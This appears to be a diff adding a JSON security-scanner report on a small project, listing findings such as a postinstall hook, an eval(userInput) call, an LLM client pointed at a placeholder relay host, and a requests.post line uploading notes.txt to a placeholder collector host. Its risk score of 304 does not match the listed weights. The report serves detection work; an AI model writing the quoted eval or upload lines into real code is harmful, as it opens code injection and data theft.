@@ -1,0 +1,82 @@
+{
+  "created_at": "2026-10-05T08:32:02.447827",
+  "disclaimer": "Automated static analysis result. Not a security certification. Provided as-is without warranty. See sigilsec.ai/terms for full terms.",
+  "files_scanned": 5,
+  "findings": [
+    {
+      "confidence": "HIGH",
+      "description": "",
+      "explanation": "",
+      "file": "package.json",
+      "line": 4,
+      "phase": "install_hooks",
+      "rule": "INSTALL-010",
+      "severity": "MEDIUM",
+      "snippet": "npm lifecycle script that only runs an inert local script: \"scripts\": { \"postinstall\": \"node setup.js\" } (postinstall: 1 script(s) checked; no capability beyond console output)",
+      "weight": 10.0
+    },
+    {
+      "confidence": "HIGH",
+      "description": "",
+      "explanation": "",
+      "file": "src/app.js",
+      "line": 2,
+      "phase": "code_patterns",
+      "rule": "CODE-001",
+      "severity": "HIGH",
+      "snippet": "eval() call \u2014 arbitrary code execution: return eval(userInput);",
+      "weight": 5.0
+    },
+    {
+      "confidence": "HIGH",
+      "description": "",
+      "explanation": "",
+      "file": "src/client.py",
+      "line": 2,
+      "phase": "inference_security",
+      "rule": "INFER-001",
+      "severity": "HIGH",
+      "snippet": "Inference security \u2014 LLM client pointed at a hardcoded endpoint (potential endpoint hijack): client = OpenAI(base_url='https://relay.example.invalid/v1', api_key=KEY)",
+      "weight": 5.0
+    },
+    {
+      "confidence": "HIGH",
+      "description": "",
+      "explanation": "",
+      "file": "src/client.py",
+      "line": 2,
+      "phase": "inference_security",
+      "rule": "INFER-012",
+      "severity": "LOW",
+      "snippet": "Inference security \u2014 LLM client baseURL points at a non-vendor host: client = OpenAI(base_url='https://relay.example.invalid/v1', api_key=KEY)",
+      "weight": 5.0
+    },
+    {
+      "confidence": "HIGH",
+      "description": "",
+      "explanation": "",
+      "file": "src/net.py",
+      "line": 2,
+      "phase": "network_exfil",
+      "rule": "NET-001",
+      "severity": "LOW",
+      "snippet": "HTTP request via requests library: requests.post(\"https://collector.example.invalid/upload\", data=open(\"notes.txt\").read())",
+      "weight": 3.0
+    }
+  ],
+  "id": "61e24ee8-e5e4-42df-a0b9-22667a4e6f81",
+  "metadata": {
+    "scanner_features": {
+      "confidence_scoring": true,
+      "context_aware_analysis": true,
+      "false_positive_reduction": true
+    }
+  },
+  "risk_score": 304.0,
+  "scan_id": "61e24ee8-e5e4-42df-a0b9-22667a4e6f81",
+  "status": "completed",
+  "target": "cli-scan",
+  "target_type": "directory",
+  "threat_intel_hits": [],
+  "verdict": "CRITICAL_RISK"
+}
